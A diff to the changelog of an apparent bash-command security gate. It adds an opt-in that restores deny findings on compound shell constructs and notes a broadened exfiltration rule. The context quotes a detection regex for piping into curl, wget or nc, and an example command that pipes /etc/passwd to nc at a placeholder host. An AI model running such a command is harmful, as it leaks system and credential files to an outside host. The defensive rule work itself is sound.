@@ -5,6 +5,26 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Added
+
+- **Opt-in to re-enable `BASH-PARSER-COMPOUND` deny findings.** The 0.63.2
+  compound-allow change was a deliberate widening of the bash gate's
+  allowlist: the L4 parser stopped emitting a CRITICAL deny on every
+  `|`, `&&`, `||`, `;`, and control-flow construct, relying on
+  per-segment classifiers and the L2 regex layer to catch dangerous
+  payloads. Operators with stricter threat models can now restore the
+  pre-0.63.2 policy via either of:
+  - Environment variable `SPELLBOOK_BASH_DENY_COMPOUND=1` (truthy values:
+    `1`, `true`, `yes`, case-insensitive).
+  - Passing `security_mode="paranoid"` to
+    `spellbook.gates.bash_parser.parse_and_check` (call-site control).
+  Either path re-emits `BASH-PARSER-COMPOUND` for `list` / `pipeline`
+  nodes AND for `if` / `for` / `while` / `until` / `case` / `function`
+  control-flow constructs. With neither opt-in active, default behavior
+  is unchanged from 0.63.2.
+
 ## [0.63.2] - 2026-05-08
 
 ### Fixed
@@ -37,6 +57,9 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `_classify_compound` now returns `[]`, and the if/for/while/until/case
   control-flow branch no longer emits COMPOUND either; the walker still
   recurses so nested CMDSUB/DIRECT-SHELL/etc. continue to surface.
+  Operators who relied on compound-deny as a policy boundary should
+  review the new opt-in introduced in [Unreleased] (see
+  `SPELLBOOK_BASH_DENY_COMPOUND` and `security_mode='paranoid'`).
 - **EXF-007 broadened to plug a pipe-to-network-tool exfiltration gap.**
   The previous regex `echo\s+.*\|\s*(curl|wget|nc)` restricted the LHS
   of the pipe to `echo`, leaving `cat /etc/passwd | nc HOST PORT`
